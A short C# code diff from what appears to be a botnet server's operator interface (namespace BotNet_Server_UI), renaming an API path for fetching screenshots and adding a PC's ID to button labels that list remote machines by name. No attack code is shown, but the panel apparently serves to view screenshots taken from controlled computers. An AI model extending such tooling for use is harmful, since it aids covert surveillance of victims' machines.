@@ -31,7 +31,7 @@ namespace BotNet_Server_UI
             }
             for (int j = 0; j < arr.Length; j++)
             {
-                if (await ApiRequest.GetProductAsync<Screen>($"/api/screens/" + arr[j].id) == default(Screen))
+                if (await ApiRequest.GetProductAsync<Screen>($"/api/screen/" + arr[j].id) == default(Screen))
                 {
                     continue;
                 }
@@ -43,7 +43,7 @@ namespace BotNet_Server_UI
                 buttons.Add(new Button()
                 {
                     Name = "b" + name,
-                    Content = "Скриншоты " + ip[i].nameofpc
+                    Content = $"Скриншоты ({ip[i].id}) " + ip[i].nameofpc
                 });
                 buttons[i].Click += Screens_Click;
                 ListScrenns.Items.Add(buttons[i]);
@@ -54,7 +54,7 @@ namespace BotNet_Server_UI
         {
             var element = e.OriginalSource as FrameworkElement;
             var name = element?.Name;
-            var screen = await ApiRequest.GetProductAsync<Screen>($"/api/screens/" + name.Remove(0, 1));
+            var screen = await ApiRequest.GetProductAsync<Screen>($"/api/screen/" + name.Remove(0, 1));
             nameofpc = ip.Find(x=>x.id == Convert.ToInt32(name.Remove(0,1))).nameofpc;
             ScreenBox screenBox = new ScreenBox(screen.screens, nameofpc)
             {
